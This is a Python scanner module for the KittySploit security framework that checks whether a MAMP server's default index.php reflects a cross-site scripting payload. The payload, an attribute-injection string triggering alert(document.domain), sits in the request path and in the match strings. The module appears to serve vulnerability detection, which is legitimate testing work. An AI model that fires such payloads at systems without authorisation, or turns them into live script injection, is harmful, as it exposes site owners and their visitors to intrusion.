#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A Cross-Site Scripting (XSS) vulnerability exists in the default installation of MAMP server."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'MAMP Server - Cross-Site Scripting Detection',
        'description': "A Cross-Site Scripting (XSS) vulnerability exists in the default installation of MAMP server. The file `/Applications/MAMP/htdocs/index.php` is susceptible to malicious input, allowing attackers to inject JavaScript code that executes in the context of the victim's browser. This vulnerability can be exploited without prior authentication.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'mamp', 'server', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://octagon.net/blog/2022/01/26/mamp-server-preauth-xss-leading-to-host-compromise-0day/',
        ],
    }

    def run(self):
        path = '/index.php/test"%20onmouseover="alert(document.domain);"%20style="font-size:100000px;background-color:white";'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        body_all = ('MAMP', 'test" onmouseover="alert(document.domain);" style',)
        ctype_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='medium',
                reason='MAMP Server - Cross-Site Scripting detected',
                path=path,
            )
            return True
        return False

